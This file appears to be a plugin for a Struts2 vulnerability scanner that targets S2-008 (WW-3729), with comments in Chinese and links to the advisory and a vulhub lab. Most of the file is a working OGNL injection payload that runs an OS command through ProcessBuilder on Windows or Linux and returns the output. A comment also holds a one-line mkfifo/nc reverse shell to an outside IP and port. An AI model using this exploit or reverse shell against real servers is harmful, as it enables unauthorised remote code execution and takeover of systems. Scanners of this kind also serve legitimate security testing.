module.exports={
	tags:"struts2,008,ww-3729,3729,parms",
	des:"WW-3729,struts2 漏洞检测",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-008",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-008.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-008",
		"https://issues.apache.org/jira/browse/WW-3729"],
	suport:g_szMyMsg,
/*
一行反弹shell:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.24.90 4444 >/tmp/f
*/
	doCheck:function (url,fnCbk,parms)
	{
		var _t = this;
		var s = "(#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
		+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
		+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
		+ ",#as=new java.lang.String()"
		+ ",#p.redirectErrorStream(true),#process=#p.start()"
		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
		+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+")";
		request(fnOptHeader({method: 'GET',uri: url + "?debug=command&expression=" + encodeURIComponent(s)
		    })
		  , function (error, response, body){
		  		if(body)
		  		{
		  			// console.log(body);
		  			fnDoBody(body,"s2-008",url,null,function(o)
		  			{
		  				var r = {"url":url,"send":s};
  						fnCbk(global.copyO2O(r,o),_t);
		  			});
		  		}
		    }
		  );
	}
};